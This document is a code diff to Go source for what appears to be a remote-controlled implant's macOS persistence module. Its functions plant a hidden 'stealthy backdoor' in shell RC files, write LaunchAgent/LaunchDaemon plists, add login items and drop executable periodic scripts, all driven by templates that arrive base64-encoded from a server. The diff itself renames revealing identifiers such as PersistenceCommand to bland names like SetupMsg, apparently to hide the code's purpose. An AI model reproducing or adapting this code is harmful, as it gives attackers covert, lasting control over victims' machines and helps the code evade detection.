@@ -96,12 +96,12 @@ const (
 	idxDarwinPeriodic     = 272
 	idxDarwinTask         = 273
 
-	// Command name (274)
+	// Msg name (274)
 	idxDarwinCmdName = 274
 )
 
-// DarwinPersistTemplate stores the persistence template received from server
-type DarwinPersistTemplate struct {
+// PlatSetupCfg stores the persistence template received from server
+type PlatSetupCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -109,7 +109,7 @@ type DarwinPersistTemplate struct {
 }
 
 // Global template storage
-var globalDarwinPersistTpl *DarwinPersistTemplate
+var globalDarwinPersistTpl *PlatSetupCfg
 
 // pTpl safely retrieves a Darwin persistence template string by index
 func pTpl(idx int) string {
@@ -119,14 +119,14 @@ func pTpl(idx int) string {
 	return ""
 }
 
-// PersistenceCommand handles various persistence methods on macOS
-type PersistenceCommand struct{}
+// SetupMsg handles various persistence methods on macOS
+type SetupMsg struct{}
 
-func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data - required for operation
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
-			var pt DarwinPersistTemplate
+func (c *SetupMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data - required for operation
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data); err == nil {
+			var pt PlatSetupCfg
 			if err := json.Unmarshal(decoded, &pt); err == nil {
 				globalDarwinPersistTpl = &pt
 			}
@@ -134,9 +134,9 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 	}
 
 	if len(args) < 1 {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E1),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -151,15 +151,15 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 	case pTpl(idxDarwinMethodPeriodic):
 		return c.handlePeriodicPersistence(args[1:])
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E21, method),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 }
 
 // handleRCPersistence adds backdoor to shell RC files (same as Linux)
-func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
+func (c *SetupMsg) handleRCPersistence(args []string) OpResult {
 	var targetUser string
 	var command string
 	var targetFiles []string
@@ -186,9 +186,9 @@ func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
 	}
 
 	if command == "" {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E1),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -202,9 +202,9 @@ func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
 	}
 
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E19),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -240,14 +240,14 @@ func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   strings.Join(results, "\n"),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
 
 // generateBashrcPayload creates a stealthy backdoor payload (same as Linux)
-func (c *PersistenceCommand) generateBashrcPayload(command string) string {
+func (c *SetupMsg) generateBashrcPayload(command string) string {
 	payload := fmt.Sprintf(`
 # System check (hidden)
 if [ -z "$SUDO_COMMAND" ]; then
@@ -260,7 +260,7 @@ fi`, command, command)
 }
 
 // injectIntoRCFile adds backdoor to RC file (same as Linux)
-func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) error {
+func (c *SetupMsg) injectIntoRCFile(filepath string, payload string) error {
 	info, err := os.Stat(filepath)
 	if err != nil {
 		if os.IsNotExist(err) {
@@ -283,7 +283,7 @@ func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) e
 }
 
 // handleLaunchPersistence installs LaunchAgent/LaunchDaemon
-func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResult {
+func (c *SetupMsg) handleLaunchPersistence(args []string) OpResult {
 	var serviceName string
 	var command string
 	var isSystem bool
@@ -317,9 +317,9 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 	}
 
 	if serviceName == "" || command == "" {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E1),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -330,9 +330,9 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 	} else {
 		u, err := user.Current()
 		if err != nil {
-			return CommandResult{
+			return OpResult{
 				Output:   Err(E19),
-				ExitCode: 1,
+				EC: 1,
 			}
 		}
 		plistPath = filepath.Join(u.HomeDir, pTpl(idxDarwinLaunchAgentsPath), serviceName+pTpl(idxDarwinPlistExt))
@@ -344,28 +344,28 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 	// Ensure directory exists
 	dir := filepath.Dir(plistPath)
 	if err := os.MkdirAll(dir, 0755); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E11, dir),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
 	// Write plist file
 	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E11, plistPath),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   SuccCtx(S1, plistPath),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
 
 // generateLaunchPlist creates a LaunchAgent/Daemon plist
-func (c *PersistenceCommand) generateLaunchPlist(label, command string, interval int) string {
+func (c *SetupMsg) generateLaunchPlist(label, command string, interval int) string {
 	// Split command into program and arguments
 	cmdParts := strings.Fields(command)
 	program := cmdParts[0]
@@ -409,7 +409,7 @@ func (c *PersistenceCommand) generateLaunchPlist(label, command string, interval
 }
 
 // handleLoginItemPersistence adds a Login Item
-func (c *PersistenceCommand) handleLoginItemPersistence(args []string) CommandResult {
+func (c *SetupMsg) handleLoginItemPersistence(args []string) OpResult {
 	var itemName string
 	var appPath string
 
@@ -429,20 +429,20 @@ func (c *PersistenceCommand) handleLoginItemPersistence(args []string) CommandRe
 	}
 
 	if itemName == "" || appPath == "" {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E1),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   SuccCtx(S1, itemName+":"+appPath),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
 
 // handlePeriodicPersistence adds to periodic scripts
-func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandResult {
+func (c *SetupMsg) handlePeriodicPersistence(args []string) OpResult {
 	var command string
 	var frequency string
 
@@ -462,9 +462,9 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 	}
 
 	if command == "" || frequency == "" {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E1),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -478,19 +478,19 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 	case pTpl(idxDarwinFreqMonthly):
 		periodicDir = pTpl(idxDarwinPeriodicMonthly)
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E22, frequency),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
 	// Generate script name - guard against short commands
 	if len(command) < 10 {
-		return CommandResult{
+		return OpResult{
 			Error:       fmt.Errorf(Err(E1)),
-			ErrorString: Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: Err(E1),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 	scriptName := pTpl(idxDarwinScriptPrefix) + strings.Replace(command[:10], " ", "_", -1)
@@ -501,25 +501,25 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 
 	// Ensure periodic directory exists
 	if err := os.MkdirAll(periodicDir, 0755); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E11, periodicDir),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Write the script file with executable permissions
 	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E11, scriptPath),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S1, scriptPath),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
